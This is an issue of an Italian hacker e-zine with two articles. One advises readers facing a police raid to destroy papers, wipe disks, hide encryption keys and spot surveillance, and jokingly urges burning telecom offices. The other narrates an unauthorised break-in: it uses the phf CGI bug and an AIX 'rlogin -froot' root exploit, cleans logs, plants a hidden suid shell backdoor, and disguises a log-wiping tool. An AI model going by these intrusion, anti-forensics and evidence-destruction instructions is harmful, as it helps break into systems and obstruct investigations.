- Il testo e' stato realizzato cosi' come lo si legge, e non si risponde di
qualsiasi uso improprio o illecito delle informazioni e dei testi in esso
contenuti.
- Qualsiasi riproduzione integrale del testo deve avvenire senza modifiche
o aggiunte, e deve riportare integralmente, senza modifiche o aggiunte,
la presente licenza di utilizzo.
- Qualsiasi riproduzione parziale di questo articolo deve avvenire senza
modifiche, ed e' possibile omettere la presente licenza di utilizzo
nella riproduzione parziale solo a condizione che venga opportunamente citato
l'autore e le fonti dei testi riprodotti.
- Tutte le traduzioni o i lavori derivati da questo testo devono essere
resi liberi nei termini specificati da questa licenza di utilizzo, devono
contenere al loro interno la presente licenza di utilizzo, in versione
integrale e senza modifiche, e devono essere approvati dall'autore con
comunicazione scritta prima della loro distribuzione, cosi' come devono
essere approvate dall'autore eventuali traduzioni della presente licenza di
utilizzo.
- E' data facolta' di commercializzare delle riproduzioni di questo testo,
di sue traduzioni o di sue versioni derivate a condizione che vengano
rispettati i termini della presente licenza di utilizzo e vengano
riconosciuti agli autori diritti intellettuali ed economici in modo
proporzionale ai vantaggi intellettuali ed economici conseguiti dalla
distribuzione e commercializzazione del libro, di sue traduzioni, o di
sue versioni derivate.
- Si vieta espressamente qualsiasi tipo di modifica che non sia stato
precedentemente concordato con autorizzazione scritta dell'autore del
testo. Tutte le modifiche non autorizzate verranno considerate una
violazione dei termini della presente licenza e quindi una violazione
del diritto d'autore.
- Si diffidano dall'utilizzo a scopo di lucro di queste informazioni tutti
i media asserviti alla logica del profitto, che vivono di cio' che pagano
i loro inserzionisti o che fanno parte di grandi gruppi editoriali che di
fatto limitano la liberta' di stampa soffocando la piccola editoria.


---------------------------------[ PARAN0iA ]---------------------------------
--------------------------------[ BlackBerry ]--------------------------------

Consumo : supposte di Takipirina, due termometri (mercurio sul tappeto),
          camomilla e miele a volonta', qualche sigaretta (appena mamma non
          vede :) ; niente Birra (causa regalo a \sPIRIT\ ) ; tanta febbre ma
	  soprattutto tante ma tante fottute medicine omeopatiche che mi
          riempiono casa (memore della maria con la quale quest'estate ero
          riuscito a curare la tonsillite a tempo record!).
          Maledetta Influenza!!!

Musica ascoltata: David Bowie "The rise and the fall of Ziggy Sturdust"
                  Lou Reed    "Rock 'n Roll Animal" e " Transformer"
                  Cypress Hill "iNSANe In tHa' BraIN" (non poteva mancare;)

TnX to: pIGpEN	    [TnX 4 477]
	\sPIRIT\    [My best Friend, and the worst sucker]
	VaNaDiO     [Who'll tap u must die]
 	SMaster	    [...i dunno how to thank u ;)]
	MaNdrAkE    [too many busts in this period, mind this man]
 	Cavallo     [HOP HOP HOP HOP, ahahah, hizz]
	Dr_Slump    [Casta is totally a Crap, Sanremoz too, nice site, nice
		     photoz]
	|scacco|    [I need u 4 a Java's training, do u like PolKA?]
	Valvoline   [Valvnet badly rulez!!]
	All tha' members of s0ftpr0ject and BadLands
	All tha' Cybernet FTN, #Cybernet_old_style, TerminalC, Goku,
        DialTone, Draven, Asbesto (tnx for your videoautoproductions,
        I'm sure I'll enjoy myself), eni
	Luc Pac and Marta McKenzie, Zero! BBS, BBKaneda, Voyager, MrZero and
	all the future BFi mirror supporters!

[00:21] [\sPIRIT\] dopo il mago oronzo il mago berry
[00:21] [\sPIRIT\] "con la sooola imposizzioneee delle manii ti formatto
		   linuux e windows novantacinqueee"
[00:22] [B_Berry] BURRRPPP!!

Bella li, premetto che quest'artcolo era gia' stato concepito e sviluppato in
gennaio 99, ma dopo i fatti accaduti a fine febbraio ho pensato di rivederlo
un po' per la vostra gioia (non me ne voglia SMa) e un po' per la mia
pignoleria o "paranoia" ;)
Tutto cio' che leggerete e' 100% invenzione, non e' mai accaduto, ne mai
accadra' (se non in un film) e cmq i nomi presenti nell'articolo (se ce ne
sono) e in particolare quello dell'autore sono stati omessi per proteggere i
deficenti, i passanti, i questori, i celerini e infine gli INNOCENTI
(del resto siamo in Italia e gli innocenti sono abituati a essere messi
sempre alla fine della lista degli innocenti, come dire, ultimi anche
in ordine di importanza).
E per concludere, visto che ho causato con le mie .sig la nascita di numerose
sette segrete di piromani, concludo questa postilla con un bel:

"Bruciate l'ufficio Telecom piu' vicino a casa vostra"
"Bruciate l'ufficio Infostrada piu' vicino a casa vostra"
"Bruciate l'ufficio Wind piu' vicino a casa vostra".

Ricordate, cambiano i padroni, ma noi restiamo sempre servi; non gioite,
le cose nuove non sono sempre le piu' buone!

ShaLL wE BeGiN'?

Paranoia: Malattia mentale caratterizzata da idee deliranti,
di persecuzione, e sim.

La definizione dice tutto, ma esclude la paranoia intesa come il non aver
ciulato con qualcuno/a, ovvero l'essere andati in bianco (differente
dall'essere andati in blu su wincazz) e comunque, mal che vada, vi ritrovate
a smanettare per l'ennesima notte di fronte ad una tastiera (questo
sul Jargon file non c'era eh? :)
Spesso, il termine paranoia e' inteso con una accezione negativa,
al contrario, nei casi che cerchero' di illustrarvi, la funzione paranoia
(se vogliamo proprio rappresentarla), avra' un grafico che, almeno nel mio
caso e in quello di \sPIRIT\, tende a + infinito, verso l'assoluto (Dio per
alcuni) e verso la liberta' e la salvezza (non spirituale, bensi' fisica).
Naturalmente piu' la funzione avra' un coefficente angolare elevato, piu'
limiteremo il tempo di rischio (tempo utile) quanto prima raggiungeremo lo
stato di delitto perfetto (HitchChoK rulez).

Non avete capito una bega di quello che vi ho detto?
Bene, allora state veramente diventando paranoici come me ;)
E ora tu, piccolo lettore di BFi, solo soletto nella tua cameretta,
abbracciato al tuo portatile ti chiederai come puo' la paranoia essere il
Parakulo, il Parafulmine, la Backdoor che ti aprira' le porte della Liberta'.

Supponiamo che abbiate sentito la voce di un imminente bust (guarda caso
ce n'e' uno in questi giorni), o che il vostro amico carder (c'era una
canzone che parlava di un amico carder) non risponde piu' alle vostre mail,
queries, telefonate, e che non ci sia nemmno piu' il suo nome sul campanello
(o qualcosa di simile), o ancora "questosilenziononmiconvince", bene e'
giunto il momento di diventare PARANOICIIIII!

[1] Materiale Cartaceo.
Bruciate numeri di telefono di amici, di verdi, di blu e di gialli.
Che non vi passi nemmeno per l'anticamera della Cpu di buttarli nella
spazzatura, il trashing e' bello farlo, non subirlo. Incenerite, dicevo,
scontrini fiscali sospetti, fatture, appunti e tutto quel cacaio di carta che
avete dietro e sotto il tavolo del PC che si e' accumulato nei mesi.

[2] Memorie di Massa.
Rendete illeggibili, con calamite potenti (con V > 4/5) e poi trashate
tutti i disketti "scomodi", anche quelli che magari non sono compromettenti
per voi ma che per qualcun altro costituiscono una solida prova (virus, docs
e quant'altro).
Ripulite gli HD dalle "minchiate" che usate di solito:
sorgenti
eseguibili
docs, emails
shortcuts e file recenti
logs file (irc, web)
cache di browser, mailers, fossils.

Importante: per cancellare si intende + che altro risciverci sopra una decina
di volte con le utiliti necessare (tipo BCWipe), in modo tale che i dati non
siano piu' accessibili nemmeno con l'acqua santa, e cmq in modo che i settori
un tempo a rischio, contengano cose inutili.

[3] Stego & Kripto.
Se vi sentite piu' sikuri, steganografate settori e/o partizioni che intendete
conservare, o formattare tutto a basso livello (magari fresando con la
smerigliatrice del padre) e riportate il vostro FS in condizioni decenti
(come se fosse quello di un principiante o del minkione sotto kasa che lo usa
solo per giochikkiare a solitario.)
PGPpate tutto e trasferite il vostro secring su disketto trovando un luogo
sikuro dove custodirlo. Per luogo sicuro si esclude la vostra abitazione,
la vostra scuola, l'ufficio e tutti quei luoghi che frequentate abitualmente.
Trovate un conoscente che non sentite da tempo e, visto che vi doveva un
favore, sbolognate a lui il secring ben sapendo che:
-non ha un pc
-non sa cos'e'
-chiedendogli di r00tare, vi rutta in faccia (se e' maleducato)

[4] Phoning.
Svuotate il buffer del modem con i numeri di telefono memorizzati ed
evitate di:
-telefonare ai bustati
-telefonare a gente che protrebbe essere bustata
-telefonare con telefonini cordless
-telefonare con cellulati Tacs, GSM, Iridium e Fido

Se proprio non potete farne a meno, usate PGP Phone.
Conseguentemente aprite i vostri telefoni, le vostre prese ed eventuali
altri luoghi che potrebbero custodire delle spie.
Ma visto e considerato che non tutti possono permettersi un rilevatore
di cimici, se dovete parlare con quelle cose, evitate di farlo in CASA o
nel bar che di solito frequentate, ma fatelo a passeggio per il centro o
sotto la doccia.

[5] Observing.
Ora bisogna controllare se si e' spiati.
Gurdatevi attorno con occhio critico e se non individuate le cose seguenti,
beh avete vinto:
-furgoncini abbandonati
-auto mai viste prima
-auto con antenne bianche sul tettuccio (digos annastro)
-lavori nell'appartamento di fianco al vostro
-qualcuno che vi segue appena uscite di casa
-visite inaspettate di Testimoni di Geova con valigette da operaio o di
 idraulici che vi entarno in casa per riparare il termosifone dietro al
 monitor
-chiamate telefoniche alle 8.00 del mattino per fare un sondaggio: vi chiedono
 se navigate su internet e altre stronzate del genere
-non siete piu' voi che guardate il televisore, ma e' il televisore che guarda
 voi
-non siete piu' voi che ascoltate la radio, ma e' la radio che ascolta voi
-un gps attakkato al vostro kulo o motorino

Bene, mi sono sfogato, mo vi lascio, se avete bisogno, scrivetemi pure a
berry.smokes.a.lot@usa.net e vedro' che fare ;)

Pace e Bene
Berry


------------------------------[ FiRST BREAK-iN ]------------------------------
--------------------------------[ DevilKiss ]---------------------------------

Autore: DevilKiss

Consumo: 1 Gelato Stecco Ducale Sammontana
         1 Succo di frutta all'Ananas

Musica ascoltata: Best of The Beast (Iron Maiden)
                  White trash, two heebs and a bean (NoFX)
                  Get a Grip (Aerosmith)

Saluti: s0ftpr0ject, TheShaman, HackerOne, AlienSun, Daniel.

Y0 all, premetto che questo articolo non e' tecnico per niente, non vi
insegnera' a entrare in qualche server, a creare qualche backdoor,
a modificare un file .c, non vi dara' delle dritte sui log, non vi spieghera'
un piffero di nulla. Magari pero' vi fara' riflettere. No, non voi hacker
gia' affermati, guru di Unix, ma voi cari miei newbie, che vi apprestate ad
entrare in qualche sistema dopo esservi letti qualche cosetta "fika" su BFi :)
Secondo me un hacker puo' essere bustato in tanti modi, ma in genere quelli
che sono beccati fanno parte di 2 categorie: novellini e "ganzi".
Per ganzi intendo gente che sono anni che smanetta sotto Unix, che e' capace
di infiltrarsi quasi (il quasi e' d'obbligo) in qualunque rete, che conosce a
mena dito ogni OS di questa terra, che ha migliaria di shell, e che ormai non
trova piu' soddisfazione nel tentare hackeraggi di piccola entita'
a providerini locali, oppure ad uni varie, ma che si cimenta in hackeraggi ad
alto livello o di siti istituzionali, o militari, oppure dove la sicurezza e'
alta o altissima, per dimostarre che lui e' l'Hacker con la H maiuscola, il
migliore.
Per novellino intendo chi e' all'inizio della sua carriera, che si e' fatto
si' e no una decina di sistemi, che magari non sa ancora quanto c'e' da sapere
sui log, che ha solo il suo account legale e che pensa che rimbalzi sia una
parola da usare solo in ambito baskettistico :)
I primi vengono bustati perche' anche se rimbalzano da 10 shell diverse,
aprono connessioni in Nuova Zelanda con il cu, cancellano ogni tipo di log,
si imbattono in qualche admin con le palle davvero, che ha tempo e voglia di
rompere i coglioni (condizioni che non e' raro trovare negli admin di siti a
carattere istituzionale) e che magari non alla prima, ma alla 10a volta
riescono a tracciarli.
I secondi vengono beccati perche' fanno qualche grossa cazzata come scordarsi
qualche log, cambiare la configurazione di una rete e non risistemarla
(diagramma di Escher by FuSyS docet :) oppure si imbattono in qualche sistema
sicuro dove l'admin sa molte cose piu' di loro e li frega.
Quindi se lasciate perdere i .mil e i .gov (e siete novellini) dovrete temere
voi stessi piu' che gli altri admin; dopo essere entrati in un server dovrete
fare SOLO quello che siete sicuri di sapere fare.
Per farvi capire meglio il concetto, vi raccontero' il mio primo break-in in
un sistema che non fosse il mio Linux. Dovrebbe apparire chiaro che (come
tutti) all'inizio ho rischiato, anche troppo, e sono stato fortunato, ma e'
meglio non basare l'hacking sul fattore "culo" ovvero sull'incompetenza di
qualche sysadmin, e basarlo invece sulle vostre forze.
A quei tempi :) cominciavano a girare le prime voci di un bug delle cgi, un
certo phf, con il quale molti siti erano stati hackerati, si diffusero i
primi testi (in inglese) in cui era descritto il bug, ma almeno io all'inizio
pensai che fosse impossibile funzionasse, troppo facile. Ciononostante lo
cominciai a testare su qualche server e...... MERAVIGLIA fungeva!!!!
Mi presi qualche file di passwd un po' qua e la' e provai a crackarne
qualcuna, ci riuscii per un computer dell'xxxxx.xx che mi diceva addirittura
che avevo come uid 0 root. Avevo sentito dire che se col phf e il comando id
si riceveva root come risposta il computer era gia' hackerato, ma non riuscivo
a capire come mai (ero ghiozzo lo so' :) o meglio ero un novellino).
Bho, pensai, intanto ci entro :) (tipico del novellino, di chi vuole passare
qualche guaio, oppure di chi ha forti istinti masochisti :) e ci entrai.

Welcome to AIX 3.2 xxxx.xxxx.xxxxx.xx
on a RISC 6000

login:xxx
passwd:

Era un AIX 3.2, li' per li' pensai "AIX .... mi pare di averlo gia' sentito,
deve essere quello che ha fatto l'IBM" e mi precipitai sui vari siti di
hacking che conoscevo per scaricarmi qualche exploit.
Uploadavo i file.c su un ftp che aveva la dir incoming scrivibile e poi
mi collegavo dall'AIX a questo ftp per scaricarmeli.
Cominciai approssimativamente alle 22:00 di un tranquillo venerdi' sera.
Fortunatamente nel sistema non c'era nessuno collegato, soltanto io, che
bounchavo da un wingate; scarico i primi 4 file .c, li compilo, li runno....
niente, il # non si vedeva, ne scarico altri, li compilo, li runno.....
sempre una misera $. Andavo lentissimo, e allora furbescamente decisi di non
passare piu' attraverso il wingate, ma di collegarmici direttamente da casa,
col mio vero ip. Andavo piu' veloce, ma non c'era un exploit provato che mi
avesse dato root.
Erano le 1:15 e cominciavo a preoccuparmi... consultai piu' siti di hacking
quella sera che in tutti i mesi precedenti, niente, gli exploit erano quelli,
non ne trovavo altri per AIX .... ero nel panico piu' totale.
2:00 e # non si vedeva, in compenso non so quante entry in lastlog avessi 
fatto, visto che mi collegavo e mi scollegavo dall'AIX in continuazione.
Ad un tratto su un sito di hacking lessi: old bugs.
Pensai "vabbe, abbiamo fatto 30 facciamo anche 31" e mi scaricai il file.
Cercavo furiosamente qualcosa per AIX, e alla fine trovai:

Os:                       Bug Type             Syntax
AIX ver 3.x.x             rlogin bug           rlogin -l -froot

alleluiaaaa, un nuovo bug, "Ma non sara' troppo facile?" pensai, "bho, tentar
non nuoce..."

rlogin 127.0.0.1 -l -froot

Immaginatevi la mia esaltazione quando vidi che fungeva e che mi ero loggato
come root! Ero al settimo cielo, avevo hackerato il mio primo server! 
Ero un grande, potevo vantarmi con gli amici, ero un hacker (o meglio pensavo
di esserlo), quella parola, che aveva suscitato in me da sempre tanta
ammirazione nei confronti di chi poteva fregiarsene, adesso mi apparteneva!
Okkey dissi, bisogna togliere i log (ero un novellino, ma qualche conoscenza
l'avevo), allora uploado il remove.c (che sapevo andasse bene per gli AIX)
e lo compilo.

# remove xxx

trattengo il fiato eh.............  funge! Non sono piu' visibile con
w finger e affini, pero' il lastlog degli AIX e' un file testuale (per
fortuna lo avevo letto da qualche parte) sicche' vado in /var/adm e...
Non c'e'! "Come non c'e'?" "Dovrebbe essere qui!" bho, proviamo in
/usr/adm "Bha, non c'e' neppure qui" ... gironzoliamo un po' ...
Dopo 20 minuti trovai la dir /etc/security e il file lastlog.
Wow, ok allora basta editarlo! siamo a cavallo !!! Ma avevo corso un po'
troppo...

# pico lastlog
unknow command pico
# joe lastlog
unknow command joe
# vi lastlog
unknow command vi

Capperi non c'era un editor che sapessi usare!!!! Panico!!!!! Erano gia' le
3:00 di notte !!! Mi gettai sui manuali di hack e di unix alla ricerca di un
editor che esistesse in AIX ed alla fine lo trovai: ed.
Non so se abbiate mai provato a modificare un file usando ed..... senza avere
un manuale da cui attingere info..... Io laciai un "man ed" sotto l'AIX, non
vi sto a dire come andasse lento...... :)
Comunque dopo circa 45 minuti di bestemmie e sproloqui vari, modificai il
il file lastlog, poi cercai nalla dir /var/adm il mio ip, e lo tolsi col
grep -v da messages e da un altro file, (access.log mi pare) cancellai la
.bash_history di xxx e tolsi da quella di root i comandi che avevo dato io
(perche' col bug del rlogin e' come se vi loggaste effettivamente come root)
sempre con l'ed.
"Okkey, adesso backdoor!!!!"
A questo punto copiai una bash nella dir /bin con il nome di .pine mi pare,
scordandomi di farla anche suid (un po' di comprensione raga, era il mio primo
break in, ero in botta :) mi ricollegai come user xxx e constatai che non
funzionava. Bestemmie, ricopio la bash e la setto suid, esco, ridivento root,
mi ritolgo dai log (che palle) e per le 4:30 finisco di copiare il remove
nella directory /usr/bin/ sotto falso nome, modificando anche la data
di creazione.
Era fatta, mi potevo scollegare, avevo vinto la mia prima battaglia.
Andai a nanna felice come una pasqua (e mi svegliai la mattina dopo con due
pesche agli occhi che arrivavano fino al mento!!!).

Ok, storiellina finita, morale? Ero diventato un hacker? Ero rimasto un
lamer? Ero sempre lo stesso? Bha, qui i pareri si dividono, secondo alcuni
dopo il tuo primo break-in sei un hacker, secondo altri non ne bastano 1000,
secondo me avevo soltanto ampliato le mie conoscenze, avevo compiuto il primo
passo, quello indispensabile, basilare nella ricerca di quella "knowledge"
infinita che tutti bramiamo, e per la quale forse mi stai leggendo
su questo numero di BFi.

DevilKiss



[ REDAZi0NE ]-----------------------------------------------------------------
	bELFaghor - BlackBerry - Cavallo - Dashie - DevilKiss - Dr.Bluedump
	Dr.Slump - FuSyS - C. Gubitosa - Jaiss - LordFelix - pIGpEN
	Pr3DaToR - SMaster - \sPIRIT\

[ WEB ]-----------------------------------------------------------------------
	http://www.sourceofkaos.com/homes/s0ftpj/
	http://softpj98.bbk.org/bfi/

[ E-MAiL ]--------------------------------------------------------------------
	bfi98@usa.net

[ PGP ]-----------------------------------------------------------------------
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3i

mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
=o7CG
-----END PGP PUBLIC KEY BLOCK-----


--------------------[ BUTCHERED ]---[ FR0M ]---[ iNSiDE ]---------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
==============================================================================
